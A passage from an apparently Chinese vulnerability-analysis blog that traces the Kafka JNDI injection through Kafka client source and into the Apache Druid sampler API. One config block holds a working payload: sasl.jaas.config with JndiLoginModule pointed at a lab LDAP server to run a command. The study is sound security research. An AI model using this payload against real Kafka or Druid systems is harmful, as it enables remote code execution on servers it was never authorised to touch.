succeeded&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (LoginException le) &#123;<br>            <span class="hljs-comment">// authentication failed</span><br>            cleanState();<br>            <span class="hljs-keyword">if</span> (debug) &#123;<br>                System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;useFirstPass failed&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> le;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// attempt the authentication by prompting for the username and pwd</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        attemptAuthentication(<span class="hljs-literal">false</span>);<br><br>        <span class="hljs-comment">// authentication succeeded</span><br>       succeeded = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (debug) &#123;<br>            System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;regular authentication succeeded&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (LoginException le) &#123;<br>        cleanState();<br>        <span class="hljs-keyword">if</span> (debug) &#123;<br>            System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;regular authentication failed&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">throw</span> le;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.sun.security.auth.module#attemptAuthentication()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-20.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attemptAuthentication</span><span class="hljs-params">(<span class="hljs-type">boolean</span> getPasswdFromSharedState)</span><br><span class="hljs-keyword">throws</span> LoginException &#123;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">encryptedPassword</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-comment">// first get the username and password</span><br>    <span class="hljs-comment">//若getPasswdFromSharedState为true代码进行运行，若为false则进入catch,不存在JNDI注入</span><br>    getUsernamePassword(getPasswdFromSharedState);<br><br>    <span class="hljs-keyword">try</span> &#123;<br><br>        <span class="hljs-comment">// get the user&#x27;s passwd entry from the user provider URL</span><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">iCtx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-comment">//JNDI注入</span><br>        ctx = (DirContext)iCtx.lookup(userProvider);<br><br>        <span class="hljs-type">SearchControls</span> <span class="hljs-variable">controls</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchControls</span>();<br>        NamingEnumeration&lt;SearchResult&gt; ne = ctx.search(<span class="hljs-string">&quot;&quot;</span>,<br>                                    <span class="hljs-string">&quot;(uid=&quot;</span> + username + <span class="hljs-string">&quot;)&quot;</span>,<br>                                    controls);<br>        <span class="hljs-keyword">if</span> (ne.hasMore()) &#123;<br>            <span class="hljs-type">SearchResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> ne.next();<br>            <br>            <span class="hljs-type">Attributes</span> <span class="hljs-variable">attributes</span> <span class="hljs-operator">=</span> result.getAttributes();<br>    ....<br><br>&#125;<br></code></pre></td></tr></table></figure><p>调用链如下：</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-21.png" alt="img"></p><p>综上若进行JNDI注入需满足一下条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">//security.protocol为SASL_SSL  SASL_PLAINTEXT<br>props.put(&quot;security.protocol&quot;,&quot;SASL_SSL&quot;);<br>bootstrap.servers不为空，为空解析报错<br>props.put(&quot;bootstrap.servers&quot;, &quot;localhost:9092&quot;);<br>key.serializer不为空，且可被解析<br>props.put(&quot;key.serializer&quot;, &quot;org.apache.kafka.common.serialization.StringSerializer&quot;);<br>value.serializer不为空，且可被解析<br>props.put(&quot;value.serializer&quot;, &quot;org.apache.kafka.common.serialization.StringSerializer&quot;);<br>//sasl.jaas.config为com.sun.security.auth.module.JndiLoginModule最终invoke至此类login()方法<br>//useFirstPass或tryFirstPass为true<br>//serviceName不为空<br>//group.provider.url不为空<br>//required user.provider.url为JNDI注入恶意地址<br>props.put(&quot;sasl.jaas.config&quot;,&quot;com.sun.security.auth.module.JndiLoginModule &quot; +<br>        &quot;required user.provider.url=\&quot;ldap://192.168.0.104:1389/Basic/Command/calc\&quot; &quot; +<br>        &quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot; +<br>        &quot;group.provider.url=\&quot;xxx\&quot;;&quot;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kafka命令执行漏洞二-Apache Druid 代码执行漏洞</title>
    <link href="/2023/04/23/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%8C-Apache-Druid-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/04/23/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%8C-Apache-Druid-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h4 id="Apache-Kafka"><a href="#Apache-Kafka" class="headerlink" title="Apache Kafka"></a>Apache Kafka</h4><p>Kafka是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。其持久化层本质上是一个“按照分布式事务日志架构的大规模发布&#x2F;订阅消息队列”，这使它作为企业级基础设施来处理流式数据非常有价值。</p><p>此漏洞允许服务器连接到攻击者的 LDAP 服务器并反序列化 LDAP 响应，攻击者可以使用它在 Kafka 连接服务器上执行 java 反序列化小工具链。当类路径中有小工具时，攻击者可以造成不可信数据的无限制反序列化（或）RCE 漏洞。</p><p>此漏洞利用的前提是：需要访问 Kafka Connect worker，并能够使用任意 Kafka 客户端 SASL JAAS 配置和基于 SASL 的安全协议在其上创建&#x2F;修改连接器。 自 Apache Kafka 2.3.0 以来，这在 Kafka Connect 集群上是可能的。 通过 Kafka Connect REST API 配置连接器时，经过身份验证的操作员可以将连接器的任何 Kafka 客户端的 <code>sasl.jaas.config</code> 属性设置为“com.sun.security.auth.module.JndiLoginModule”，它可以是通过“producer.override.sasl.jaas.config”,“consumer.override.sasl.jaas.config”或“admin.override.sasl.jaas.config”属性完成。</p><h4 id="Apache-Druid"><a href="#Apache-Druid" class="headerlink" title="Apache Druid"></a>Apache Druid</h4><p>Apache Druid是一个高性能的实时大数据分析引擎，支持快速数据摄取、实时查询和数据可视化。它主要用于OLAP（在线分析处理）场景，能处理PB级别的数据。Druid具有高度可扩展、低延迟和高吞吐量的特点，广泛应用于实时监控、事件驱动分析、用户行为分析、网络安全等领域。通过使用Druid，企业和开发者可以快速获得实时分析结果，提升决策效率。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Druid可添加Apache Kafka数据，存在Apache Kafka导致的JNDI注入漏洞，造成远程代码执行</p><h4 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><p>Apache Druid &lt;&#x3D; 25.0</p><h2 id="二、KafkaConsumer"><a href="#二、KafkaConsumer" class="headerlink" title="二、KafkaConsumer"></a>二、KafkaConsumer</h2><p>上篇讲到Producer&lt;String, String&gt; producer &#x3D; new KafkaProducer&lt;&gt;(props); 可造成JNDI注入</p><p>org.apache.kafka.clients.consumer.KafkaConsumer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Map&lt;String, Object&gt; configs)</span> &#123;<br>    <span class="hljs-built_in">this</span>((Map)configs, (Deserializer)<span class="hljs-literal">null</span>, (Deserializer)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Properties properties)</span> &#123;<br>    <span class="hljs-built_in">this</span>((Properties)properties, (Deserializer)<span class="hljs-literal">null</span>, (Deserializer)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Properties properties, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer)</span> &#123;<br>    <span class="hljs-built_in">this</span>(Utils.propsToMap(properties), keyDeserializer, valueDeserializer);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Map&lt;String, Object&gt; configs, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer)</span> &#123;<br>    <span class="hljs-built_in">this</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsumerConfig</span>(ConsumerConfig.appendDeserializerToConfig(configs, keyDeserializer, valueDeserializer)), keyDeserializer, valueDeserializer);<br>&#125;<br><br><span class="hljs-comment">//最终调用至此构造方法</span><br>KafkaConsumer(ConsumerConfig config, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer) &#123;<br>    <span class="hljs-built_in">this</span>.closed = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.currentThread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(-<span class="hljs-number">1L</span>);<br>    <span class="hljs-built_in">this</span>.refcount = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">GroupRebalanceConfig</span> <span class="hljs-variable">groupRebalanceConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroupRebalanceConfig</span>(config, ProtocolType.CONSUMER);<br>        <span class="hljs-built_in">this</span>.groupId = Optional.ofNullable(groupRebalanceConfig.groupId);<br>        <span class="hljs-built_in">this</span>.clientId = config.getString(<span class="hljs-string">&quot;client.id&quot;</span>);<br>        LogContext logContext;<br>        <span class="hljs-keyword">if</span> (groupRebalanceConfig.groupInstanceId.isPresent()) &#123;<br>            logContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogContext</span>(<span class="hljs-string">&quot;[Consumer instanceId=&quot;</span> + (String)groupRebalanceConfig.groupInstanceId.get() + <span class="hljs-string">&quot;, clientId=&quot;</span> + <span class="hljs-built_in">this</span>.clientId + <span class="hljs-string">&quot;, groupId=&quot;</span> + (String)<span class="hljs-built_in">this</span>.groupId.orElse(<span class="hljs-string">&quot;null&quot;</span>) + <span class="hljs-string">&quot;] &quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            logContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogContext</span>(<span class="hljs-string">&quot;[Consumer clientId=&quot;</span> + <span class="hljs-built_in">this</span>.clientId + <span class="hljs-string">&quot;, groupId=&quot;</span> + (String)<span class="hljs-built_in">this</span>.groupId.orElse(<span class="hljs-string">&quot;null&quot;</span>) + <span class="hljs-string">&quot;] &quot;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.log = logContext.logger(<span class="hljs-built_in">this</span>.getClass());<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">enableAutoCommit</span> <span class="hljs-operator">=</span> config.maybeOverrideEnableAutoCommit();<br>        <span class="hljs-built_in">this</span>.groupId.ifPresent((groupIdStr) -&gt; &#123;<br>            <span class="hljs-keyword">if</span> (groupIdStr.isEmpty()) &#123;<br>                <span class="hljs-built_in">this</span>.log.warn(<span class="hljs-string">&quot;Support for using the empty group id by consumers is deprecated and will be removed in the next major release.&quot;</span>);<br>            &#125;<br><br>        &#125;);<br>        <span class="hljs-built_in">this</span>.log.debug(<span class="hljs-string">&quot;Initializing the Kafka consumer&quot;</span>);<br>        <span class="hljs-built_in">this</span>.requestTimeoutMs = (<span class="hljs-type">long</span>)config.getInt(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>);<br>        <span class="hljs-built_in">this</span>.defaultApiTimeoutMs = config.getInt(<span class="hljs-string">&quot;default.api.timeout.ms&quot;</span>);<br>        <span class="hljs-built_in">this</span>.time = Time.SYSTEM;<br>        <span class="hljs-built_in">this</span>.metrics = buildMetrics(config, <span class="hljs-built_in">this</span>.time, <span class="hljs-built_in">this</span>.clientId);<br>        <span class="hljs-built_in">this</span>.retryBackoffMs = config.getLong(<span class="hljs-string">&quot;retry.backoff.ms&quot;</span>);<br>        List&lt;ConsumerInterceptor&lt;K, V&gt;&gt; interceptorList = config.getConfiguredInstances(<span class="hljs-string">&quot;interceptor.classes&quot;</span>, ConsumerInterceptor.class, Collections.singletonMap(<span class="hljs-string">&quot;client.id&quot;</span>, <span class="hljs-built_in">this</span>.clientId));<br>        <span class="hljs-built_in">this</span>.interceptors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsumerInterceptors</span>(interceptorList);<br>        <span class="hljs-keyword">if</span> (keyDeserializer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.keyDeserializer = (Deserializer)config.getConfiguredInstance(<span class="hljs-string">&quot;key.deserializer&quot;</span>, Deserializer.class);<br>            <span class="hljs-built_in">this</span>.keyDeserializer.configure(config.originals(Collections.singletonMap(<span class="hljs-string">&quot;client.id&quot;</span>, <span class="hljs-built_in">this</span>.clientId)), <span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            config.ignore(<span class="hljs-string">&quot;key.deserializer&quot;</span>);<br>            <span class="hljs-built_in">this</span>.keyDeserializer = keyDeserializer;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (valueDeserializer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.valueDeserializer = (Deserializer)config.getConfiguredInstance(<span class="hljs-string">&quot;value.deserializer&quot;</span>, Deserializer.class);<br>            <span class="hljs-built_in">this</span>.valueDeserializer.configure(config.originals(Collections.singletonMap(<span class="hljs-string">&quot;client.id&quot;</span>, <span class="hljs-built_in">this</span>.clientId)), <span class="hljs-literal">false</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            config.ignore(<span class="hljs-string">&quot;value.deserializer&quot;</span>);<br>            <span class="hljs-built_in">this</span>.valueDeserializer = valueDeserializer;<br>        &#125;<br><br>        <span class="hljs-type">OffsetResetStrategy</span> <span class="hljs-variable">offsetResetStrategy</span> <span class="hljs-operator">=</span> OffsetResetStrategy.valueOf(config.getString(<span class="hljs-string">&quot;auto.offset.reset&quot;</span>).toUpperCase(Locale.ROOT));<br>        <span class="hljs-built_in">this</span>.subscriptions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubscriptionState</span>(logContext, offsetResetStrategy);<br>        <span class="hljs-type">ClusterResourceListeners</span> <span class="hljs-variable">clusterResourceListeners</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.configureClusterResourceListeners(keyDeserializer, valueDeserializer, <span class="hljs-built_in">this</span>.metrics.reporters(), interceptorList);<br>        <span class="hljs-built_in">this</span>.metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsumerMetadata</span>(<span class="hljs-built_in">this</span>.retryBackoffMs, config.getLong(<span class="hljs-string">&quot;metadata.max.age.ms&quot;</span>), !config.getBoolean(<span class="hljs-string">&quot;exclude.internal.topics&quot;</span>), config.getBoolean(<span class="hljs-string">&quot;allow.auto.create.topics&quot;</span>), <span class="hljs-built_in">this</span>.subscriptions, logContext, clusterResourceListeners);<br>        List&lt;InetSocketAddress&gt; addresses = ClientUtils.parseAndValidateAddresses(config.getList(<span class="hljs-string">&quot;bootstrap.servers&quot;</span>), config.getString(<span class="hljs-string">&quot;client.dns.lookup&quot;</span>));<br>        <span class="hljs-built_in">this</span>.metadata.bootstrap(addresses);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">metricGrpPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;consumer&quot;</span>;<br>        <span class="hljs-type">FetcherMetricsRegistry</span> <span class="hljs-variable">metricsRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FetcherMetricsRegistry</span>(Collections.singleton(<span class="hljs-string">&quot;client-id&quot;</span>), metricGrpPrefix);<br>        <span class="hljs-comment">//调用至ClientUtils.createChannelBuilder 接下来调用链与一相同，不再赘述</span><br>        <span class="hljs-type">ChannelBuilder</span> <span class="hljs-variable">channelBuilder</span> <span class="hljs-operator">=</span> ClientUtils.createChannelBuilder(config, <span class="hljs-built_in">this</span>.time, logContext);<br>        <span class="hljs-built_in">this</span>.isolationLevel = IsolationLevel.valueOf(config.getString(<span class="hljs-string">&quot;isolation.level&quot;</span>).toUpperCase(Locale.ROOT));<br>        <span class="hljs-type">Sensor</span> <span class="hljs-variable">throttleTimeSensor</span> <span class="hljs-operator">=</span> Fetcher.throttleTimeSensor(<span class="hljs-built_in">this</span>.metrics, metricsRegistry);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">heartbeatIntervalMs</span> <span class="hljs-operator">=</span> config.getInt(<span class="hljs-string">&quot;heartbeat.interval.ms&quot;</span>);<br>        <span class="hljs-type">ApiVersions</span> <span class="hljs-variable">apiVersions</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApiVersions</span>();<br>        <span class="hljs-type">NetworkClient</span> <span class="hljs-variable">netClient</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkClient</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Selector</span>(config.getLong(<span class="hljs-string">&quot;connections.max.idle.ms&quot;</span>), <span class="hljs-built_in">this</span>.metrics, <span class="hljs-built_in">this</span>.time, metricGrpPrefix, channelBuilder, logContext), <span class="hljs-built_in">this</span>.metadata, <span class="hljs-built_in">this</span>.clientId, <span class="hljs-number">100</span>, config.getLong(<span class="hljs-string">&quot;reconnect.backoff.ms&quot;</span>), config.getLong(<span class="hljs-string">&quot;reconnect.backoff.max.ms&quot;</span>), config.getInt(<span class="hljs-string">&quot;send.buffer.bytes&quot;</span>), config.getInt(<span class="hljs-string">&quot;receive.buffer.bytes&quot;</span>), config.getInt(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>), config.getLong(<span class="hljs-string">&quot;socket.connection.setup.timeout.ms&quot;</span>), config.getLong(<span class="hljs-string">&quot;socket.connection.setup.timeout.max.ms&quot;</span>), <span class="hljs-built_in">this</span>.time, <span class="hljs-literal">true</span>, apiVersions, throttleTimeSensor, logContext);<br>    ......<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable var18) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.log != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.close(<span class="hljs-number">0L</span>, <span class="hljs-literal">true</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaException</span>(<span class="hljs-string">&quot;Failed to construct kafka consumer&quot;</span>, var18);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、Apache-Druid环境配置"><a href="#三、Apache-Druid环境配置" class="headerlink" title="三、Apache Druid环境配置"></a>三、Apache Druid环境配置</h2><p>1、修改jvm.config，远程debug</p><p>目录为apache-druid-xxx\conf\druid\single-server\micro-quickstart\coordinator-overlord\jvm.config</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span><br>suspend=n表示的是启动Java应用时是否立即进入调试模式;<br>suspend=y表示启动即暂停，suspend=n则表示启动时不需要暂停;<br>address=*:<span class="hljs-number">5005</span>表示的是Debug监听的服务地址和端口，根据需求修改，上述配置会监听到<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br></code></pre></td></tr></table></figure><p><img src="/image/kafkadruidimage-0.png" alt="img"></p><p>2、启动Apache Druid</p><p>运行bin&#x2F;下start-micro-quickstart</p><p><img src="/image/kafkadruidimage-1.png" alt="img"></p><p>访问ip:8888,成功访问</p><p><img src="/image/kafkadruidimage-2.png" alt="img"></p><h2 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h2><h3 id="前端输入"><a href="#前端输入" class="headerlink" title="前端输入"></a>前端输入</h3><p>Apache Druid添加kafka</p><p><img src="/image/kafkadruidimage-3.png" alt="img"></p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>存在漏洞API接口为&#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler</p><p>接口类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径</span><br><span class="hljs-meta">@Path(&quot;/druid/indexer/v1/sampler&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SamplerResource</span>&#123;<br>  <span class="hljs-comment">//post方法  </span><br>  <span class="hljs-meta">@POST</span><br>  <span class="hljs-comment">//指定http请求的MIME类型为application/json</span><br>  <span class="hljs-meta">@Consumes(MediaType.APPLICATION_JSON)</span><br>  <span class="hljs-comment">//指定http响应的MIME类型application/json</span><br>  <span class="hljs-meta">@Produces(MediaType.APPLICATION_JSON)</span><br>  <span class="hljs-meta">@ResourceFilters(StateResourceFilter.class)</span><br>  <span class="hljs-keyword">public</span> SamplerResponse <span class="hljs-title function_">post</span><span class="hljs-params">(<span class="hljs-keyword">final</span> SamplerSpec sampler)</span>&#123;<br>    <span class="hljs-comment">//Preconditions.checkNotNull(sampler, &quot;Request body cannot be empty&quot;) 判断sampler是否为空</span><br>    <span class="hljs-comment">//调用sampler#sample()方法</span><br>    <span class="hljs-keyword">return</span> Preconditions.checkNotNull(sampler, <span class="hljs-string">&quot;Request body cannot be empty&quot;</span>).sample();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.druid.client.indexing.SamplerSpec为接口，声明方法sample()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//用于配置JSON 序列化和反序列化过程中使用哪种类型信息。该注解是实现多态类型的必要注解。</span><br><span class="hljs-comment">//配置此即可在 json 中通过 type 定义反序列化为子类</span><br><span class="hljs-meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = &quot;type&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SamplerSpec</span>&#123;<br>  SamplerResponse <span class="hljs-title function_">sample</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/kafkadruidimage-4.png" alt="img"></p><p>org.apache.druid.indexing.seekablestream.SeekableStreamSamplerSpec实现接口SamplerSpec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">SeekableStreamSamplerSpec</span><span class="hljs-params">(</span><br><span class="hljs-params">  //ingestionSpec</span><br><span class="hljs-params">  <span class="hljs-keyword">final</span> SeekableStreamSupervisorSpec ingestionSpec,</span><br><span class="hljs-params">  <span class="hljs-meta">@Nullable</span> <span class="hljs-keyword">final</span> SamplerConfig samplerConfig,</span><br><span class="hljs-params">  <span class="hljs-keyword">final</span> InputSourceSampler inputSourceSampler</span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-comment">//ingestionSpec不为空  dataSchema为ingestionSpec.dataSchema</span><br><span class="hljs-built_in">this</span>.dataSchema = Preconditions.checkNotNull(ingestionSpec, <span class="hljs-string">&quot;[spec] is required&quot;</span>).getDataSchema();<br><span class="hljs-comment">//ioConfig不为空</span><br><span 